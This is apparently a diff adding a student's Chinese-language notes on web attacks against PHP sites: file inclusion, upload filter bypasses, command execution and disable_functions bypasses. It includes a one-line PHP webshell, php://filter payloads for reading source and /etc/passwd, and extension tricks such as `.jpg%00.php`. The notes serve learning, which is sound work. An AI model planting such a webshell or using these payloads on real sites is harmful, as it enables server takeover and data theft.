+  将https的请求转换为类似`gopher`协议的可控TCP请求. 
+  [参考](https://blog.zeddyu.info/2021/04/20/tls-poison/)
+
+### 杂项
+学长说某些东西接触多了之后就会有经验了, 比如说常见的php的网页的储存位置: 
+```
+一般的存放位置
+file://host/var/www/html/index.php
+或者也可以用一个技巧来得到位置
+file://host/proc/self/cwd/index.php
+```
+
+针对php的一句话木马, 一般的思考就是利用下面讲的PHP的攻击, 写入类似于这样的木马: 
+```php
+<?php eval(@$_GET["input"]); php>
+```
+
+达到攻击的目的. 
+
+## 针对PHP的攻击
+### 文件包含
+只要php源代码中有包含用户指定的文件名的代码的时候, 如`include($_GET['filename'])`, 
+这样就有可能产生文件包含漏洞. 于是就可以读取文件, 执行任意php代码等. 
+
+文件读取的一个利用: 
+* `include('etc/passwd')`
+* `php://filter`将原始读取的文件通过过滤器, 进行字符串转换操作, 可以用来绕过
+  * `include('php://filter/read=convert.base64-encode/resource=/index.php');`    
+    这样就可以将`index.php`的内容用`base64`编码加密后输出, 
+    而不是直接被当成php代码执行. 
+  * `convert.iconv`, `<input-encoding>.<output-encoding>`等过滤器
+  * `convert.iconv`的[高级操作](https://tttang.com/archive/1395/) (不是很理解)
+* `php://input`接受`http post`的内容
+* 利用文件的上传产生一个临时文件, 最后执行临时文件写入命令
+
+
+### 文件上传
+有`file_put_contents`, `fwrite`, `move_uploaded_file`方法的函数, 和写文件有关. 
+
+| 防御手段 | 绕过手段 |
+| -------- | -------- |
+| Post表单里面的Content-Type验证 | 这个是用户可以自己瞎改的, 所以也很少用了 |
+| 列一个后缀名的黑名单, 比如禁止上传`.php`后缀 | `.php/.` php bug <br> `.jpg/.php` 服务器解析漏洞 IIS&Nginx<br>`.jpg%00.php` 服务器解析漏洞 Nginx<br>`.php.rar` Apache解析漏洞, 因为没有`rar`的handler |
+
+### 命令执行
+有`system()`, `exec()`, `eval()`, `shell_exec()`, `proc_open()`, `passthru`的命令时, 
+有可能会出现命令执行的问题. 
+
+防御手段有php的`escapeshellarg`, `escapeshellcmd`的字符串处理, 
+(就是把要命的字符转义掉), `disable_functions`选项. 
+
+`escapeshellcmd`绕过的方法, 
+[参考](https://github.com/kacperszurek/exploits/blob/master/GitList/exploit-bypass-php-escapeshellarg-escapeshellcmd.md#argument-injection)
+(不得不说, 有人整理真是好)
+
+`disable_functions`的绕过: 
+(因为`disable_functions`的原理就像是把函数的名字从环境里面删掉, 
+而不是在内存里面删除函数, 所以只是找不到, 而不是不能用. )
+* 调用系统函数来执行命令
+* fastcgi交互修改php配置项, 进行拓展执行命令
+* 内存破坏的漏洞攻击
+
+(网络上的一个[整理](https://book.hacktricks.xyz/pentesting/pentesting-web/php-tricks-esp/php-useful-functions-disable_functions-open_basedir-bypass))
+
+## 后记
+感觉越写越潦草了, 估计要多试一试才能懂. 
+
+就先这样. :p
